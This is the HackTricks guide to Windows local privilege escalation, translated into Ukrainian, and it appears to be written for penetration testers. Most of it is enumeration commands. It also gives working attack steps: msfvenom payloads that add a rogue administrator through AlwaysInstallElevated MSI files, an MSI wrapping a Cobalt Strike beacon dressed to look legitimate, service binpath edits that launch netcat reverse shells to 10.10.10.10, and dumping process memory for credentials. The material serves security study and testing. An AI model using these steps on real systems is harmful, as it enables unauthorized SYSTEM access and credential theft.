# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте наступну сторінку перед продовженням:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**Перевірте наступну сторінку для отримання додаткової інформації про ACL - DACL/SACL/ACE:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності в Windows, вам слід прочитати наступну сторінку перед продовженням:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Контроль безпеки Windows

Є різні речі в Windows, які можуть **перешкоджати вам перераховувати систему**, запускати виконувані файли або навіть **виявляти вашу діяльність**. Вам слід **прочитати** наступну **сторінку** та **перерахувати** всі ці **механізми** **захисту** перед початком перерахунку підвищення привілеїв:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Інформація про систему

### Перерахунок інформації про версію

Перевірте, чи має версія Windows якісь відомі вразливості (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) корисний для пошуку детальної інформації про вразливості безпеки Microsoft. Ця база даних містить більше 4,700 вразливостей безпеки, що демонструє **масштабну поверхню атаки**, яку представляє середовище Windows.

**На системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github репозиторії експлойтів:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Будь-які облікові дані/соковита інформація збережені в змінних середовища?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли транскрипції PowerShell

Ви можете дізнатися, як це увімкнути в [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконання конвеєра PowerShell записуються, охоплюючи виконані команди, виклики команд та частини скриптів. Однак повні деталі виконання та результати виходу можуть не бути зафіксовані.

Щоб увімкнути це, дотримуйтесь інструкцій у розділі "Файли транскрипції" документації, обираючи **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій з журналів PowersShell, ви можете виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Повний запис активності та вмісту виконання скрипта фіксується, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає всебічний аудит кожної активності, що є цінним для судової експертизи та аналізу шкідливої поведінки. Документуючи всю активність під час виконання, надаються детальні відомості про процес.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Логування подій для Script Block можна знайти в Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, ви можете використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення не запитуються за допомогою http**S**, а за допомогою http.

Ви починаєте з перевірки, чи використовує мережа оновлення WSUS без SSL, запустивши наступне:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Якщо ви отримаєте відповідь, таку як:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` дорівнює `1`.

Тоді, **це експлуатовано.** Якщо останній реєстр дорівнює 0, то запис WSUS буде проігноровано.

Для експлуатації цих вразливостей ви можете використовувати інструменти, такі як: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - це скрипти експлойтів MiTM, які дозволяють ввести 'фальшиві' оновлення в трафік WSUS без SSL.

Прочитайте дослідження тут:

{% file src="../../images/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
В основному, це недолік, який експлуатує цей баг:

> Якщо ми маємо можливість змінювати наш локальний проксі, і Windows Updates використовує проксі, налаштований у параметрах Internet Explorer, ми, отже, маємо можливість запускати [PyWSUS](https://github.com/GoSecure/pywsus) локально, щоб перехоплювати наш власний трафік і виконувати код як підвищений користувач на нашому активі.
>
> Більше того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми згенеруємо самопідписаний сертифікат для імені хоста WSUS і додамо цей сертифікат у сховище сертифікатів поточного користувача, ми зможемо перехоплювати як HTTP, так і HTTPS трафік WSUS. WSUS не використовує механізми, подібні до HSTS, для реалізації валідації типу trust-on-first-use на сертифікат. Якщо сертифікат, що подається, довіряється користувачем і має правильне ім'я хоста, він буде прийнятий службою.

Ви можете експлуатувати цю вразливість, використовуючи інструмент [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли він буде звільнений).

## KrbRelayUp

В **локальному підвищенні привілеїв** існує вразливість у Windows **доменних** середовищах за певних умов. Ці умови включають середовища, де **підписування LDAP не є обов'язковим,** користувачі мають самостійні права, що дозволяють їм налаштовувати **обмежену делегацію на основі ресурсів (RBCD),** та можливість для користувачів створювати комп'ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за допомогою **налаштувань за замовчуванням**.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Для отримання додаткової інформації про хід атаки перевірте [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 реєстри **увімкнені** (значення **0x1**), тоді користувачі будь-яких привілеїв можуть **встановлювати** (виконувати) `*.msi` файли як NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Пейлоади Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку, використовуючи модуль **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використовуйте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI бінарний файл для ескалації привілеїв. Цей скрипт генерує попередньо скомпільований MSI інсталятор, який запитує додавання користувача/групи (тому вам знадобиться доступ GIU):
```
Write-UserAddMSI
```
Просто виконайте створений бінар для ескалації привілеїв.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI обгортку за допомогою цих інструментів. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо ви **просто** хочете **виконати** **командні рядки**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI з WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI з Visual Studio

- **Згенеруйте** з Cobalt Strike або Metasploit **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Створити новий проект** і введіть "installer" у поле пошуку. Виберіть проект **Setup Wizard** і натисніть **Далі**.
- Дайте проекту ім'я, наприклад, **AlwaysPrivesc**, використовуйте **`C:\privesc`** для розташування, виберіть **розмістити рішення та проект в одній директорії**, і натисніть **Створити**.
- Продовжуйте натискати **Далі**, поки не дійдете до кроку 3 з 4 (виберіть файли для включення). Натисніть **Додати** і виберіть payload Beacon, який ви щойно згенерували. Потім натисніть **Готово**.
- Виділіть проект **AlwaysPrivesc** у **Solution Explorer** і в **Властивостях** змініть **TargetPlatform** з **x86** на **x64**.
- Є й інші властивості, які ви можете змінити, такі як **Автор** та **Виробник**, що можуть зробити встановлений додаток більш легітимним.
- Клацніть правою кнопкою миші на проекті та виберіть **Перегляд > Користувацькі дії**.
- Клацніть правою кнопкою миші на **Встановити** та виберіть **Додати користувацьку дію**.
- Двічі клацніть на **Тека програми**, виберіть ваш файл **beacon.exe** і натисніть **ОК**. Це забезпечить виконання payload beacon, як тільки інсталятор буде запущено.
- У **Властивостях користувацької дії** змініть **Run64Bit** на **True**.
- Нарешті, **зберіть його**.
- Якщо з'явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу на x64.

### Встановлення MSI

Щоб виконати **встановлення** шкідливого файлу `.msi` у **фоновому режимі:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, ви можете використовувати: _exploit/windows/local/always_install_elevated_

## Антивіруси та детектори

### Налаштування аудиту

Ці налаштування визначають, що **реєструється**, тому вам слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди надсилаються журнали
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **управління паролями локальних адміністраторів**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп'ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory і можуть бути доступні лише користувачам, яким надано достатні дозволи через ACL, що дозволяє їм переглядати паролі локальних адміністраторів, якщо це дозволено.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активний, **паролі у відкритому тексті зберігаються в LSASS** (Служба підсистеми локальної безпеки).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft впровадила покращений захист для Локального органу безпеки (LSA), щоб **блокувати** спроби ненадійних процесів **читати його пам'ять** або інжектувати код, додатково захищаючи систему.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** був представлений у **Windows 10**. Його мета - захистити облікові дані, збережені на пристрої, від загроз, таких як атаки pass-the-hash. | [**Більше інформації про Credentials Guard тут.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Облікові дані домену** автентифікуються **Локальним органом безпеки** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, облікові дані домену для користувача зазвичай встановлюються.\
[**Більше інформації про кешовані облікові дані тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та Групи

### Перерахунок Користувачів та Груп

Вам слід перевірити, чи є у будь-яких груп, до яких ви належите, цікаві дозволи.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до якоїсь привілейованої групи, ви можете мати можливість підвищити привілеї**. Дізнайтеся про привілейовані групи та як їх зловживати для підвищення привілеїв тут:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та як їх зловживати:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійшені користувачі / Сесії
```bash
qwinsta
klist sessions
```
### Домашні папки
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Дозволи на файли та папки

Перш за все, перерахування процесів **перевіряє наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати деякий запущений бінарний файл** або чи маєте ви права на запис у папку з бінарними файлами для експлуатації можливих [**DLL Hijacking атак**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** які працюють, ви можете зловживати цим для ескалації привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Витягування паролів з пам'яті

Ви можете створити дамп пам'яті працюючого процесу, використовуючи **procdump** з sysinternals. Служби, такі як FTP, мають **облікові дані у відкритому тексті в пам'яті**, спробуйте зробити дамп пам'яті та прочитати облікові дані.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI додатки

**Додатки, що працюють як SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Довідка та підтримка Windows" (Windows + F1), знайдіть "командний рядок", натисніть "Натисніть, щоб відкрити командний рядок"

## Служби

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc** для отримання інформації про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Аутентифіковані користувачі" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP звідси](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнути службу

Якщо ви отримуєте цю помилку (наприклад, з SSDPSRV):

_Сталася системна помилка 1058._\
&#xNAN;_&#x54;лужба не може бути запущена, або тому, що вона вимкнена, або тому, що з нею не пов'язано жодних увімкнених пристроїв._

Ви можете увімкнути її, використовуючи
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Інший обхідний шлях** цієї проблеми - запустити:
```
sc.exe config usosvc start= auto
```
### **Змінити шлях до бінарного файлу служби**

У сценарії, коли група "Аутентифіковані користувачі" має **SERVICE_ALL_ACCESS** на службу, можливе модифікування виконуваного бінарного файлу служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапустити службу
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можуть бути підвищені через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування бінарного файлу служби.
- **WRITE_DAC**: Дозволяє переналаштування дозволів, що веде до можливості змінювати конфігурації служби.
- **WRITE_OWNER**: Дозволяє отримання прав власності та переналаштування дозволів.
- **GENERIC_WRITE**: Спадкує можливість змінювати конфігурації служби.
- **GENERIC_ALL**: Також спадкує можливість змінювати конфігурації служби.

Для виявлення та експлуатації цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Слабкі дозволи бінарних файлів служб

**Перевірте, чи можете ви змінити бінарний файл, який виконується службою** або чи маєте ви **права на запис у папці**, де знаходиться бінарний файл ([**DLL Hijacking**](dll-hijacking/))**.**\
Ви можете отримати кожен бінарний файл, який виконується службою, використовуючи **wmic** (не в system32) і перевірити свої дозволи, використовуючи **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Послуги реєстру змінити дозволи

Вам слід перевірити, чи можете ви змінити будь-який реєстр служби.\
Ви можете **перевірити** свої **дозволи** над реєстром **служби**, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Необхідно перевірити, чи **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** мають права `FullControl`. Якщо так, бінарний файл, виконуваний службою, може бути змінено.

Щоб змінити шлях до виконуваного бінарного файлу:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Дозволи AppendData/AddSubdirectory реєстру служб

Якщо у вас є цей дозвіл над реєстром, це означає, що **ви можете створювати підреєстри з цього**. У випадку служб Windows це **досить для виконання довільного коду:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Непозначені шляхи до служб

Якщо шлях до виконуваного файлу не в лапках, Windows спробує виконати кожен закінчення перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Список всіх непозначених шляхів служб, за винятком тих, що належать вбудованим службам Windows:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows дозволяє користувачам вказувати дії, які потрібно виконати, якщо служба зазнає збою. Цю функцію можна налаштувати для вказівки на бінарний файл. Якщо цей бінарний файл можна замінити, можлива ескалація привілеїв. Більше деталей можна знайти в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Перевірте **дозволи бінарних файлів** (можливо, ви зможете переписати один і ескалувати привілеї) та **папок** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете ви змінити якийсь конфігураційний файл, щоб прочитати якийсь спеціальний файл, або чи можете ви змінити якийсь бінарний файл, який буде виконаний обліковим записом адміністратора (schedtasks).

Спосіб знайти слабкі права на папки/файли в системі - це зробити:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Запуск при старті

**Перевірте, чи можете ви перезаписати деякі реєстри або бінарні файли, які будуть виконані іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **місця автозапуску для ескалації привілеїв**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **драйвери третіх сторін, які є дивними/вразливими**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Якщо у вас є **права на запис у папці, що знаходиться в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.

Перевірте права доступу до всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цим перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Мережа

### Спільні ресурси
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп'ютерів, закодованих у файлі hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте **обмежені сервіси** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Таблиця
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Перевірте цю сторінку для команд, пов'язаних з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої енумерації тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права root, ви зможете прослуховувати будь-який порт (перший раз, коли ви використовуєте `nc.exe` для прослуховування порту, він запитає через GUI, чи слід дозволити `nc` через брандмауер).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, ви можете спробувати `--default-user root`

